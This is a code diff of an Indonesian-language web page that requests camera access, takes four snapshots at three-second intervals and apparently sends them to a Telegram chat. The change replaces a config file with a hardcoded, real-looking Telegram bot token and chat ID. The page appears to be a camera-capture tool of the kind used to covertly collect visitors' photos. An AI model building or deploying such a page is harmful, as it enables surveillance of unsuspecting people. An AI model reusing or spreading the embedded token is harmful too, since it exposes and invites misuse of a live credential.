@@ -50,7 +50,6 @@
             display: none;
         }
     </style>
-    <script src="config.js"></script>
 </head>
 <body>
     <div id="status">Membutuhkan izin kamera untuk mengambil gambar.</div>
@@ -62,8 +61,8 @@
         const context = canvasElement.getContext('2d');
         const statusDiv = document.getElementById('status');
         const permissionButton = document.getElementById('permissionButton');
-        const botToken = telegramConfig.botToken;
-        const chatId = telegramConfig.chatId;
+        const botToken = '7863353249:AAGeLK7vgDRaqXrdL6dLLSmogSyySPjda7k'; // API Key Bot Telegram
+        const chatId = '-4634384561'; // Chat ID Telegram
         const captureCount = 4; // Jumlah pengambilan gambar
         const intervalTime = 3000; // Interval waktu antar pengambilan (3 detik)
         let imagesSent = 0;
